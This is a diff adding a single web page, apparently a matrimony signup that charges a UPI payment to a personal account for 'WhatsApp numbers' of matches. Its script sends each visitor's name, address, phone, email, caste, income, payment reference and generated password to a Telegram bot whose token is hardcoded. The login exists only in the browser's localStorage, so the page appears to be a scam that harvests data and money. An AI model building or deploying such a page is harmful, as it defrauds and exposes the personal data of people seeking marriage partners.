@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Indian Matrimony — Payment Flow (UPI QR)</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{--navy:#002a5b;--blue:#007bff;--gold:#ffd700;--card:#f8fbff;--muted:#6b7a8a}
+  *{box-sizing:border-box}
+  body{font-family:'Poppins',sans-serif;margin:0;background:radial-gradient(circle at 10% 10%, #fff7e6, #e8f4ff 40%, #e6f0ff 70%);color:#0f2440}
+  .hero{max-width:1100px;margin:28px auto 12px;padding:22px;display:flex;gap:20px;align-items:center;background:linear-gradient(90deg,var(--navy),#004d99);color:white;border-radius:14px;box-shadow:0 12px 40px rgba(0,0,0,0.15)}
+  .hero .title{font-size:1.6rem;font-weight:700}
+  .hero .subtitle{font-size:0.95rem;opacity:0.95;margin-top:6px}
+  .hero .cta{margin-left:auto;display:flex;gap:10px;align-items:center}
+  .btn{padding:10px 16px;border-radius:10px;border:none;cursor:pointer;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.12)}
+  .btn-primary{background:linear-gradient(90deg,var(--blue),#0056d6);color:white}
+  .btn-ghost{background:transparent;color:white;border:1px solid rgba(255,255,255,0.12)}
+  .wrap{max-width:1100px;margin:18px auto;padding:0 16px;display:grid;grid-template-columns:1fr;gap:22px}
+  .card{background:var(--card);border-radius:14px;padding:24px;box-shadow:0 12px 30px rgba(15,36,64,0.06);border:1px solid rgba(3,57,115,0.04)}
+  .center{text-align:center}
+  h2{margin:0 0 12px;color:var(--navy)}
+  label{display:block;margin:10px 0 6px;font-weight:600;color:#12314a}
+  input, select, textarea{width:100%;padding:11px 12px;border-radius:10px;border:1.6px solid #cfe6ff;background:white;font-size:0.98rem}
+  input:focus,select:focus,textarea:focus{outline:none;box-shadow:0 6px 18px rgba(0,123,255,0.12);border-color:var(--blue)}
+  .row{display:flex;gap:12px}
+  .col{flex:1}
+  .info{background:#eef8ff;padding:12px;border-left:5px solid var(--blue);border-radius:8px;color:#0a3a63}
+  .qr{text-align:center;margin:16px 0}
+  #qr-code canvas,#qr-code img{width:170px;height:170px;display:block;margin:10px auto}
+  .modal{max-width:900px;margin:0 auto;display:none}
+  .actions{display:flex;gap:12px;margin-top:12px}
+  .small{font-size:0.9rem;color:var(--muted)}
+  .login-card{max-width:420px;margin:0 auto}
+  .success{background:#e9fff1;border-left:5px solid #27ae60;padding:12px;border-radius:8px;color:#0b5b2e}
+  footer{max-width:1100px;margin:18px auto;text-align:center;color:#284c6b;font-size:0.95rem}
+  footer a{color:var(--blue);font-weight:600;text-decoration:none}
+  @media(max-width:820px){.hero{flex-direction:column;align-items:flex-start;gap:10px}.row{flex-direction:column}}
+  .qr-popup{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:9999;background:white;padding:18px;border-radius:12px;box-shadow:0 12px 40px rgba(3,57,115,0.25);display:none}
+  .qr-popup h4{margin:0 0 8px}
+  .overlay{position:fixed;left:0;top:0;right:0;bottom:0;background:rgba(0,0,0,0.45);display:none;z-index:9998}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+
+<div class="hero">
+  <div>
+    <div class="title">🇮🇳 Indian Matrimony</div>
+    <div class="subtitle">Pay via UPI QR → Enter UTR → Get Login ID & Password</div>
+  </div>
+  <div class="cta">
+    <button id="showSignupBtn" class="btn btn-primary">Signup</button>
+    <button id="showLoginBtn" class="btn btn-ghost">Login</button>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <div id="signupModal" class="modal card" style="display:none">
+    <div style="display:flex;align-items:center;justify-content:space-between">
+      <h2>Signup — Matrimony Registration</h2>
+      <button id="closeSignup" class="btn" style="background:#f0f4ff;border:1px solid #d8e8ff;color:var(--navy)">Close</button>
+    </div>
+
+    <form id="matriForm" autocomplete="on">
+      <div class="row">
+        <div class="col">
+          <label for="name">Name</label>
+          <input id="name" name="name" required />
+        </div>
+        <div class="col">
+          <label for="phone">Phone</label>
+          <input id="phone" name="phone" pattern="\d{10}" placeholder="10-digit" required />
+        </div>
+      </div>
+
+      <label for="address">Address</label>
+      <input id="address" name="address" required />
+
+      <div class="row">
+        <div class="col">
+          <label for="location">Location</label>
+          <select id="location" name="location" required>
+            <option value="">Select Location</option>
+            <option>Hyderabad</option>
+            <option>Bangalore</option>
+            <option>Chennai</option>
+            <option>Pune</option>
+            <option>Noida</option>
+            <option>Mumbai</option>
+            <option>Delhi</option>
+            <option>Kolkata</option>
+            <option>West Bengal</option>
+          </select>
+        </div>
+        <div class="col">
+          <label for="status">Marital Status</label>
+          <select id="status" name="status" required>
+            <option value="">Select</option>
+            <option>Single</option>
+            <option>Married</option>
+            <option>Unmarried</option>
+            <option>Live in</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="row" style="margin-top:8px">
+        <div class="col">
+          <label for="email">Email</label>
+          <input id="email" name="email" type="email" required />
+        </div>
+        <div class="col">
+          <label for="education">Education</label>
+          <select id="education" name="education" required>
+            <option value="">Select</option>
+            <option>Madhyamik</option>
+            <option>Higher Secondary</option>
+            <option>Graduate</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="row" style="margin-top:8px">
+        <div class="col">
+          <label for="caste">Caste</label>
+          <select id="caste" name="caste" required>
+            <option value="">Select</option>
+            <option>General</option>
+            <option>ST</option>
+            <option>SC</option>
+            <option>OBC</option>
+          </select>
+        </div>
+        <div class="col">
+          <label for="income">Monthly Income (₹)</label>
+          <input id="income" name="income" type="number" min="0" required />
+        </div>
+      </div>
+
+      <label for="photo">Upload Photo</label>
+      <input id="photo" name="photo" type="file" accept="image/*" />
+
+      <h3 style="margin-top:18px">Subscription Plans</h3>
+      <p class="info small">1 Month - ₹50 (5 WhatsApp numbers) · 2 Months - ₹100 (10 numbers) · 3 Months - ₹200 (20 numbers)</p>
+
+      <label for="plan">Select Plan</label>
+      <select id="plan" name="plan" required>
+        <option value="50">1 Month - ₹50</option>
+        <option value="100">2 Months - ₹100</option>
+        <option value="200">3 Months - ₹200</option>
+      </select>
+
+      <div class="qr">
+        Payment to: <strong id="upiIdText">Sourav629015@kotak</strong>
+        <div id="qr-code"></div>
+        <div style="margin-top:8px">
+          <button type="button" id="openQr" class="btn" style="background:#fff;border:1px solid #d8e8ff">Open QR (Pay Now)</button>
+          <button type="button" id="copyUpi" class="btn" style="background:#f0f4ff;border:1px solid #d8e8ff;color:var(--navy)">Copy UPI</button>
+        </div>
+        <div class="small" style="margin-top:8px">Scan QR with any UPI app (Google Pay / PhonePe / Paytm) and complete payment.</div>
+      </div>
+
+      <div id="paymentActions" style="display:flex;gap:12px;align-items:center;margin-top:10px">
+        <label><input type="checkbox" id="paidCheck" /> I have paid</label>
+      </div>
+
+      <div id="utrArea" style="display:none;margin-top:10px">
+        <label for="utr">Transaction UTR (UPI)</label>
+        <input id="utr" name="utr" placeholder="Enter UTR number" />
+      </div>
+
+      <div class="actions" style="margin-top:12px">
+        <button type="submit" id="submitBtn" class="btn btn-primary" disabled>Submit Registration</button>
+        <button type="button" id="cancelBtn" class="btn" style="background:#fff;border:1px solid #d8e8ff">Cancel</button>
+      </div>
+    </form>
+  </div>
+
+  <div id="loginCard" class="card login-card center">
+    <h2>Login</h2>
+    <p class="small">Use Login ID & Password given at Signup</p>
+    <div style="max-width:360px;margin:0 auto">
+      <label for="loginUser">Login ID</label>
+      <input id="loginUser" />
+      <label for="loginPassInput">Password</label>
+      <input id="loginPassInput" type="password" />
+      <div class="actions" style="margin-top:12px">
+        <button id="loginBtn" class="btn btn-primary">Login</button>
+        <button id="clearStorage" class="btn" style="background:#fff;border:1px solid #d8e8ff">Clear Users</button>
+      </div>
+      <p id="loginMessage" class="small" style="margin-top:10px;color:#6b7a8a"></p>
+    </div>
+
+    <div id="afterLogin" style="display:none;margin-top:14px">
+      <div class="success" id="welcomeBox"></div>
+      <div style="margin-top:10px;text-align:left">
+        <h4>WhatsApp Submission Panel</h4>
+        <div id="infoPanel" style="display:none">
+          <label for="whatsapp2">Enter WhatsApp Number</label>
+          <input id="whatsapp2" placeholder="10-digit" pattern="\d{10}" />
+          <div class="actions">
+            <button id="submitWhatsApp" class="btn btn-primary">Submit WhatsApp Number</button>
+          </div>
+          <p id="whatsapp-info" class="small"></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="credBox" class="card" style="display:none;max-width:620px;margin:0 auto">
+    <h2>Signup Successful</h2>
+    <p id="thankMsg">Your registration is successful. Note your login credentials below:</p>
+    <p><strong>Login ID:</strong> <span id="loginId"></span></p>
+    <p><strong>Password:</strong> <span id="loginPass"></span></p>
+    <div class="small">Use above credentials to login from the Login card.</div>
+  </div>
+
+</div>
+
+<footer>
+  Connected via <a href="https://t.me/Indian_matrimony85" target="_blank">Telegram Channel: https://t.me/Indian_matrimony85</a>
+  <br>
+  Or visit: https://t.me/Indian_matrimony85
+</footer>
+
+<div class="overlay" id="overlay"></div>
+<div class="qr-popup" id="qrPopup">
+  <h4>Scan & Pay</h4>
+  <div id="qrPopupCode"></div>
+  <p class="small" style="margin-top:8px">UPI ID: <strong id="qrPopupUpi"></strong></p>
+  <div style="margin-top:10px;display:flex;gap:8px;justify-content:center">
+    <button id="closeQrPopup" class="btn" style="background:#fff;border:1px solid #d8e8ff">Close</button>
+    <button id="copyUpiPopup" class="btn" style="background:#f0f4ff;border:1px solid #d8e8ff;color:var(--navy)">Copy UPI</button>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE";
+const CHAT_ID  = "-1003102946985";
+
+const showSignupBtn = document.getElementById('showSignupBtn');
+const showLoginBtn = document.getElementById('showLoginBtn');
+const signupModal = document.getElementById('signupModal');
+const closeSignup = document.getElementById('closeSignup');
+const cancelBtn = document.getElementById('cancelBtn');
+const matriForm = document.getElementById('matriForm');
+const submitBtn = document.getElementById('submitBtn');
+const credBox = document.getElementById('credBox');
+const loginIdSpan = document.getElementById('loginId');
+const loginPassSpan = document.getElementById('loginPass');
+const loginUserInput = document.getElementById('loginUser');
+const loginPassInput = document.getElementById('loginPassInput');
+const loginBtnEl = document.getElementById('loginBtn');
+const loginMessage = document.getElementById('loginMessage');
+const afterLogin = document.getElementById('afterLogin');
+const welcomeBox = document.getElementById('welcomeBox');
+const infoPanel = document.getElementById('infoPanel');
+const whatsappInfo = document.getElementById('whatsapp-info');
+const submitWhatsApp = document.getElementById('submitWhatsApp');
+const whatsapp2 = document.getElementById('whatsapp2');
+const qrContainer = document.getElementById('qr-code');
+const planSelect = document.getElementById('plan');
+const upiIdText = document.getElementById('upiIdText');
+const paidCheck = document.getElementById('paidCheck');
+const utrArea = document.getElementById('utrArea');
+const utrInput = document.getElementById('utr');
+const openQr = document.getElementById('openQr');
+const copyUpi = document.getElementById('copyUpi');
+const overlay = document.getElementById('overlay');
+const qrPopup = document.getElementById('qrPopup');
+const qrPopupCode = document.getElementById('qrPopupCode');
+const qrPopupUpi = document.getElementById('qrPopupUpi');
+const closeQrPopup = document.getElementById('closeQrPopup');
+const copyUpiPopup = document.getElementById('copyUpiPopup');
+
+const STORAGE_KEY = 'matrimony_users_v1';
+
+function randomId(len=6){ return 'MAT'+Math.random().toString().slice(2,2+len).toUpperCase(); }
+function randomPw(){ return 'PW'+Math.floor(1000+Math.random()*9000); }
+function loadUsers(){ try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; } catch(e){return [];} }
+function saveUsers(arr){ localStorage.setItem(STORAGE_KEY, JSON.stringify(arr)); }
+function escapeHtml(text){ if(!text) return ''; return String(text).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function genQR(container, upi, amount){
+  container.innerHTML = '';
+  const upiUri = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Indian%20Matrimony&am=${amount}&cu=INR`;
+  new QRCode(container, { text: upiUri, width:170, height:170, colorDark:"#064273", colorLight:"#ffffff", correctLevel: QRCode.CorrectLevel.H });
+}
+
+genQR(qrContainer, upiIdText.textContent.trim(), planSelect.value);
+planSelect.addEventListener('change', () => genQR(qrContainer, upiIdText.textContent.trim(), planSelect.value));
+
+openQr.addEventListener('click', () => {
+  qrPopup.style.display = 'block';
+  overlay.style.display = 'block';
+  qrPopupUpi.textContent = upiIdText.textContent.trim();
+  genQR(qrPopupCode, upiIdText.textContent.trim(), planSelect.value);
+});
+closeQrPopup.addEventListener('click', () => {
+  qrPopup.style.display = 'none';
+  overlay.style.display = 'none';
+  qrPopupCode.innerHTML = '';
+});
+overlay.addEventListener('click', () => {
+  qrPopup.style.display = 'none';
+  overlay.style.display = 'none';
+  qrPopupCode.innerHTML = '';
+});
+copyUpi.addEventListener('click', () => {
+  navigator.clipboard.writeText(upiIdText.textContent.trim()).then(() => alert('UPI ID copied to clipboard'));
+});
+copyUpiPopup.addEventListener('click', () => {
+  navigator.clipboard.writeText(upiIdText.textContent.trim()).then(() => alert('UPI ID copied to clipboard'));
+});
+
+showSignupBtn.addEventListener('click', () => {
+  signupModal.style.display = 'block';
+  window.scrollTo({top:0,behavior:'smooth'});
+});
+closeSignup.addEventListener('click', () => { signupModal.style.display = 'none'; });
+cancelBtn.addEventListener('click', () => { signupModal.style.display = 'none'; });
+
+paidCheck.addEventListener('change', () => {
+  if (paidCheck.checked) {
+    utrArea.style.display = 'block';
+    checkSubmitEnabled();
+  } else {
+    utrArea.style.display = 'none';
+    submitBtn.disabled = true;
+  }
+});
+utrInput.addEventListener('input', checkSubmitEnabled);
+function checkSubmitEnabled() {
+  const utr = utrInput.value.trim();
+  submitBtn.disabled = !(paidCheck.checked && utr.length >= 3);
+}
+
+async function sendToTelegram(message) {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
+    });
+    return res;
+  } catch (err) {
+    console.error("Telegram send error:", err);
+    return { ok: false, reason: err };
+  }
+}
+
+matriForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  submitBtn.disabled = true; submitBtn.textContent = 'Submitting...';
+
+  const form = new FormData(matriForm);
+  const data = {
+    name: form.get('name') || '',
+    address: form.get('address') || '',
+    status: form.get('status') || '',
+    phone: form.get('phone') || '',
+    email: form.get('email') || '',
+    education: form.get('education') || '',
+    caste: form.get('caste') || '',
+    income: form.get('income') || '',
+    plan: form.get('plan') || '',
+    utr: form.get('utr') || '',
+    location: form.get('location') || '',
+    photo: form.get('photo') ? form.get('photo').name : ''
+  };
+
+  if(!paidCheck.checked){
+    alert('Please confirm payment by checking "I have paid"');
+    submitBtn.disabled = false; submitBtn.textContent = 'Submit Registration';
+    return;
+  }
+  if(!data.utr || data.utr.trim().length < 3){
+    alert('Please enter your UTR number (at least 3 characters).');
+    submitBtn.disabled = false; submitBtn.textContent = 'Submit Registration';
+    return;
+  }
+
+  const loginId = randomId(6);
+  const password = randomPw();
+
+  // Telegram message including login credentials
+  const message = `<b>New Matrimony Registration</b>\nName: ${escapeHtml(data.name)}\nAddress: ${escapeHtml(data.address)}\nLocation: ${escapeHtml(data.location)}\nMarital Status: ${escapeHtml(data.status)}\nPhone: ${escapeHtml(data.phone)}\nEmail: ${escapeHtml(data.email)}\nEducation: ${escapeHtml(data.education)}\nCaste: ${escapeHtml(data.caste)}\nMonthly Income: ₹${escapeHtml(data.income)}\nSubscription Plan: ₹${escapeHtml(data.plan)}\nPayment UTR: ${escapeHtml(data.utr)}\nPhoto: ${escapeHtml(data.photo)}\n\nLogin ID: ${loginId}\nPassword: ${password}`;
+
+  // Send to Telegram (non-blocking)
+  await sendToTelegram(message);
+
+  // Save to localStorage
+  const users = loadUsers();
+  users.push({ loginId, password, ...data, createdAt: new Date().toISOString() });
+  saveUsers(users);
+
+  // UI updates
+  loginIdSpan.textContent = loginId;
+  loginPassSpan.textContent = password;
+  credBox.style.display = 'block';
+  signupModal.style.display = 'none';
+  submitBtn.disabled = false; submitBtn.textContent = 'Submit Registration';
+  matriForm.reset();
+  utrArea.style.display = 'none';
+  paidCheck.checked = false;
+  genQR(qrContainer, upiIdText.textContent.trim(), planSelect.value);
+});
+
+showLoginBtn.addEventListener('click', () => {
+  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+  loginUserInput.focus();
+});
+
+loginBtnEl.addEventListener('click', () => {
+  const id = (loginUserInput.value || '').trim();
+  const pass = (loginPassInput.value || '').trim();
+  const users = loadUsers();
+  const user = users.find(u => u.loginId === id && u.password === pass);
+  if(user){
+    loginMessage.textContent = '';
+    afterLogin.style.display = 'block';
+    welcomeBox.textContent = `Welcome, ${user.name || user.loginId}! (Logged in)`;
+    infoPanel.style.display = 'block';
+    const planLimit = calcWhatsAppLimit(user.plan);
+    whatsappInfo.textContent = `We will send ${planLimit} number(s) to your WhatsApp within 1 month of subscription.`;
+    sessionStorage.setItem('matrimony_current_user', user.loginId);
+  } else {
+    loginMessage.textContent = 'Invalid Login ID or Password';
+    afterLogin.style.display = 'none';
+  }
+});
+
+function calcWhatsAppLimit(plan){
+  if(plan === '50') return 5;
+  if(plan === '100') return 10;
+  if(plan === '200') return 20;
+  return 0;
+}
+
+submitWhatsApp.addEventListener('click', async () => {
+  const w = (whatsapp2.value || '').trim();
+  if(!/^\d{10}$/.test(w)){ alert('Please enter a valid 10-digit WhatsApp number'); return; }
+  const cur = sessionStorage.getItem('matrimony_current_user');
+  if(!cur){ alert('Session expired. Please login again.'); return; }
+  const users = loadUsers();
+  const user = users.find(u => u.loginId === cur);
+  if(!user){ alert('User not found.'); return; }
+  const msg = `<b>WhatsApp Number Submitted</b>\nLogin ID: ${user.loginId}\nWhatsApp Number: ${escapeHtml(w)}`;
+  const res = await sendToTelegram(msg);
+  if(res && res.ok) alert('✅ WhatsApp number submitted.');
+  else alert('⚠️ Could not send to Telegram (check BOT_TOKEN / CHAT_ID).');
+});
+
+document.getElementById('clearStorage').addEventListener('click', () => {
+  if(confirm('Clear all saved users from localStorage?')){ localStorage.removeItem(STORAGE_KEY); alert('Cleared'); }
+});
+
+(function init(){
+  const cur = sessionStorage.getItem('matrimony_current_user');
+  if(cur){
+    const users = loadUsers();
+    const user = users.find(u => u.loginId === cur);
+    if(user){
+      afterLogin.style.display = 'block';
+      welcomeBox.textContent = `Welcome back, ${user.name || user.loginId}!`;
+      infoPanel.style.display = 'block';
+      whatsappInfo.textContent = `We will send ${calcWhatsAppLimit(user.plan)} number(s) to your WhatsApp within 1 month.`;
+    }
+  }
+})();
+</script>
+
+</body>
+</html>
